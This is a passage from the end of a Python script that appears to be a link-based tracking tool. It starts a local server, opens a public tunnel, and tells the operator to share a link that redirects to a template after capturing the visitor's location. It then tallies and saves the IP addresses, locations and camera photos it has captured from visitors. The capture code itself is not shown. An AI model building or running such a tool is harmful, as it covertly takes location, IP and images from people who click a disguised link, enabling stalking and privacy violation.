    server_thread.daemon = True
    server_thread.start()
    
    print(f"\n\033[92m[+]\033[0m Local server running on http://{LOCALHOST}:{PORT}")
    
    # Start tunnel
    public_url = select_tunnel()
    
    if public_url:
        print(f"\n\033[92m[+]\033[0m Share this link: \033[4m{public_url}\033[0m")
        print("\033[93m[*] The link will redirect to the template after location capture\033[0m")
    else:
        print(f"\n\033[93m[*]\033[0m Using local URL: http://{LOCALHOST}:{PORT}")
        print("\033[93m[*] This will only work on your local network\033[0m")
    
    try:
        monitor_captures()
    except KeyboardInterrupt:
        print("\n\033[93m[*] Stopping...\033[0m")
    finally:
        stop_event.set()
        httpd.shutdown()
        cleanup()
        
        # Show summary
        print("\n\033[94m=== Session Summary ===\033[0m")
        print(f"IPs captured: {len(captured_data['ips'])}")
        print(f"Locations captured: {len(captured_data['locations'])}")
        print(f"Photos captured: {len(captured_data['photos'])}")
        
        # Save summary
        with open('session_summary.txt', 'w') as f:
            json.dump(captured_data, f, indent=2)
        print("\n\033[92m[+]\033[0m Summary saved to session_summary.txt")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[93m[*] Exiting...\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Error: {e}\033[0m")
        cleanup()
